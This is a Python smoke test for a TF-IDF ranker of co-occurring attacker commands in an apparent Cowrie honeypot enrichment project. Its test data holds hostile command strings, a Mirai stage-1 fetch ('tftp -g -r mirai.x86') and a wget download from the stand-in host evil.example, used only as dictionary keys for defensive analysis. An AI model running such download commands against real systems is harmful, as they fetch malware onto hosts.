"""Smoke test for the TF-IDF cooccurring-sibling ranker (ROADMAP #6).

Standalone — no ES, no LLM, no pytest. Hand-crafted tf / df maps fed to the
pure-function ranker, asserting that:
  * a corpus-common sibling ranks BELOW a corpus-rare sibling of comparable tf
  * the previous binary cutoff's failure mode (Mirai stage-1 under 40% leaking
    into unrelated droppers) is reversed by IDF demotion
  * top-k is respected
  * empty / degenerate inputs are graceful
  * self-command exclusion is the caller's job (we test indirect: the ranker
    operates purely on what it's given)

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_cooccurrence_idf.py
"""
from __future__ import annotations

import math
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.sources.cowrie.commands import score_cooccurring_siblings

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


# -------------------------------------------------------------------------
# [1] The audit's exact scenario: Mirai stage-1 commands under 40% corpus
# session-frequency leak into unrelated dropper embeddings. After the fix
# they should rank BELOW a specifically-correlated low-df sibling.
# -------------------------------------------------------------------------
print("\n[1] Audit scenario: Mirai stage-1 (high-df) vs specific marker (low-df)")
# Window of 12 sessions around some anchor dropper command.
tf = {
    "tftp -g -r mirai.x86":   8,    # Mirai stage-1, frequent in the window
    "wget evil.example/uniq": 6,    # specific marker for this dropper
    "uname -a":               10,   # universal boilerplate
}
# Corpus of 1000 sessions.
df = {
    "tftp -g -r mirai.x86":   300,  # 30% — leaked through old 40% cutoff
    "wget evil.example/uniq": 8,    # 0.8% — genuinely specific
    "uname -a":               900,  # 90% — universal
}
out = score_cooccurring_siblings(tf, df, total_sessions=1000, top_k=8)
ordered = [sib for sib, _ in out]
check("specific marker ranks above Mirai stage-1",
      ordered.index("wget evil.example/uniq") < ordered.index("tftp -g -r mirai.x86"),
      f"order={ordered}")
check("Mirai stage-1 ranks above boilerplate",
      ordered.index("tftp -g -r mirai.x86") < ordered.index("uname -a"),
      f"order={ordered}")
# Demote-not-reject: corpus-common siblings still appear in the list
# (the LLM gets to see them, just demoted).
check("corpus-common sibling not categorically dropped",
      "uname -a" in ordered, f"order={ordered}")


# -------------------------------------------------------------------------
# [2] Returned tuples preserve raw tf, not the score — downstream prompt
# display continues to show concrete session counts.
# -------------------------------------------------------------------------
print("\n[2] Output tuples carry raw window tf (not the score)")
for sib, count in out:
    check(f"tf preserved for {sib!r}", count == tf[sib], f"got {count}, want {tf[sib]}")


# -------------------------------------------------------------------------
# [3] top-k respected
# -------------------------------------------------------------------------
print("\n[3] top_k cap respected")
tf3 = {f"cmd_{i}": (10 - i) for i in range(10)}
df3 = {f"cmd_{i}": (i + 1) for i in range(10)}
out3 = score_cooccurring_siblings(tf3, df3, total_sessions=1000, top_k=3)
check("len == top_k", len(out3) == 3, f"got len={len(out3)}")


# -------------------------------------------------------------------------
# [4] Empty inputs are graceful.
# -------------------------------------------------------------------------
print("\n[4] Empty / degenerate inputs")
check("empty tf → empty out",
      score_cooccurring_siblings({}, {"x": 1}, 100, 8) == [],
      "empty tf should yield empty result")


# -------------------------------------------------------------------------
# [5] total_sessions <= 0 → fall back to raw tf ordering (idf undefined).
# Caller may not always have N (e.g. in re-embed dry runs); we should not
# crash and should produce a sensible order.
# -------------------------------------------------------------------------
print("\n[5] Fallback to raw tf when total_sessions <= 0")
tf5 = {"a": 3, "b": 7, "c": 5}
out5 = score_cooccurring_siblings(tf5, {}, total_sessions=0, top_k=8)
ordered5 = [sib for sib, _ in out5]
check("fallback orders by raw tf desc", ordered5 == ["b", "c", "a"], f"got {ordered5}")
out5b = score_cooccurring_siblings(tf5, {"a": 1, "b": 1, "c": 1}, total_sessions=-1, top_k=8)
check("fallback when N negative too", [s for s, _ in out5b] == ["b", "c", "a"],
      f"got {out5b!r}")


# -------------------------------------------------------------------------
# [6] Math sanity: score formula is what we documented.
# salience = tf * ln((N+1)/(df+1))
# -------------------------------------------------------------------------
print("\n[6] Score formula matches doc")
N = 1000
tf6 = {"hi_signal": 5, "low_signal": 5}
df6 = {"hi_signal": 10, "low_signal": 500}
expected_hi  = 5 * (math.log(N + 1) - math.log(11))
expected_low = 5 * (math.log(N + 1) - math.log(501))
check("hi_signal score > low_signal score",
      expected_hi > expected_low,
      f"expected_hi={expected_hi:.3f}, expected_low={expected_low:.3f}")
out6 = score_cooccurring_siblings(tf6, df6, N, top_k=8)
check("low_df sibling ranks first", next(s for s, _ in out6) == "hi_signal",
      f"got {out6!r}")


# -------------------------------------------------------------------------
# [7] Missing df entry for a sibling → treat as df=1 (high salience), but
# this only happens transiently when ES returns fewer df buckets than tf
# (e.g. agg size cap). Just confirm no crash and the unknown sibling still
# gets ranked.
# -------------------------------------------------------------------------
print("\n[7] Missing df entry doesn't crash")
out7 = score_cooccurring_siblings(
    tf_by_sib={"known": 5, "unknown": 5},
    df_by_sib={"known": 500},
    total_sessions=1000,
    top_k=8,
)
present = [s for s, _ in out7]
check("both siblings present in output", set(present) == {"known", "unknown"},
      f"got {present!r}")
check("unknown (df=1) ranks above known (df=500)",
      present.index("unknown") < present.index("known"),
      f"got {present!r}")


# -------------------------------------------------------------------------
# Summary
# -------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
